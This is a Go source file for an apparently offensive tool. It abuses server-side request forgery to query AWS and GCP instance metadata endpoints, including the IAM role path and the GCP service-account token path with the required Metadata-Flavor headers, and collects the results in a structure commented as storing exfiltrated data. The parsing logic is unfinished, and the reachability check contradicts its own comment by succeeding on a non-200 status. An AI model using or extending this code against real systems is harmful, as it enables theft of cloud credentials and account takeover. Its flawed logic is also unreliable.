package sneak

import (
	"errors"
	"fmt"
	"net/http"
	"time"
)

// All cloud metadata endpoints we support to perform SSRF against
type MetadataEndpoints map[string]*CloudSsrf

type CloudSsrf struct {
	// HTTP client to interact with endpoints
	Client *http.Client

	// URLs exposed by internal VPC for SSRF checks
	Endpoint []string

	// Endpoint to ping first to validate cloud provider
	Litmus string

	// Will be populated by `CheckLitmus` with the actual URL we can use
	Actual string

	// Headers we may need to set (this is mainly for GCP)
	Headers *map[string]string

	// API paths to hit to recover sensitive information
	Paths map[string]string

	// Callback to consume the current check being done and process it from the response
	PostProcessor func(check string, resp *http.Response) error

	// Stores information that we've exfiltrated from an SSRF attack
	Finalized map[string]string
}

// Checks if the endpoint for the provider is reachable, in order to confirm that
// the service actually is being hosted by the provider
func (c *CloudSsrf) CheckLitmus() bool {

	// check if each specified URL + endpoint is reachable
	for _, endpoint := range c.Endpoint {
		req, err := http.NewRequest("GET", endpoint+"/"+c.Litmus, nil)
		if err != nil {
			continue
		}

		if c.Headers != nil {
			for key, value := range *c.Headers {
				req.Header.Add(key, value)
			}
		}

		resp, err := c.Client.Do(req)
		if err != nil {
			continue
		}

		// must get a 200 status to be reachable/exploitable
		// TODO: validate if this is true for all providers
		if resp.StatusCode != 200 {
			c.Actual = endpoint
			return true
		}
	}
	return false
}

// Once it's confirmed that we can reach the endpoint let's exfiltrate
func (c *CloudSsrf) Exploit() error {
	for check, endpoint := range c.Paths {
		fmt.Printf("Running `%s`\n", check)

		url := c.Actual + "/" + endpoint
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			return err
		}

		if c.Headers != nil {
			for key, value := range *c.Headers {
				req.Header.Add(key, value)
			}
		}

		// execute and prepare to parse response
		resp, err := c.Client.Do(req)
		if err != nil {
			return err
		}
		if resp.StatusCode != 200 {
			return errors.New("cannot reach the API endpoint during exploitation")
		}

		// use the postprocessor callback to appropriately handle the response and
		// parse out juicy information for us
		//c.Finalized[check] = c.PostProcessor(check, resp)
	}

	// we couldn't process anything for some reason
	return nil
}

func GetMetadataEndpoints() MetadataEndpoints {
	// we should get an immediate response on every request, don't waste time
	client := http.Client{
		Timeout: time.Duration(2 * time.Second),
	}
	return map[string]*CloudSsrf{
		"aws": &CloudSsrf{
			Client:   &client,
			Endpoint: []string{"http://169.254.169.254"},
			Litmus:   "/latest/",
			Headers:  nil,
			Paths: map[string]string{
				"hostname": "/latest/meta-data/hostname",
				"token":    "/latest/meta-data/iam/",
			},
			PostProcessor: func(check string, resp *http.Response) error {
				// TODO
				return nil
			},
		},
		"gcp": &CloudSsrf{
			Client:   &client,
			Endpoint: []string{"http://169.254.169.254", "http://metadata.google.internal"},
			Litmus:   "/computeMetadata/",
			Headers: &map[string]string{
				"Metadata-Flavor":           "Google",
				"X-Google-Metadata-Request": "True",
			},
			Paths: map[string]string{
				// GCP has a convenient parameter that dumps everything, so we don't multiple requests
				"all": "/computeMetadata/v1/?recursive=True",

				// TODO: is `default` always going to be the case for service accounts?
				"token": "/computeMetadata/v1/instance/service-accounts/default/token",
			},
			PostProcessor: func(check string, resp *http.Response) error {

				/*
					// there's quite a lot here, so we won't try to iteratively parse through,
					// and instead just return everything as a string
					if check == "all" {
						body, err := ioutil.ReadAll(resp.Body)
						if err != nil {
							return nil
						}
						return string(body)

					} else if check == "token" {

						var tokenResponse struct {
							AccessToken string `json:"access_token"`
							TokenType   string `json:"token_type"`
							ExpiresIn   int    `json:"expires_in"`
						}

					}
					return nil
				*/
				return nil
			},
		},
		/*
		   "do": CloudSsrf{
		       Litmus: "http://169.254.169.254/metadata/v1/"
		   },
		   "azure": CloudSsrf{
		       Litmus: "http://169.254.169.254/metadata/instance",
		   },
		*/
	}
}
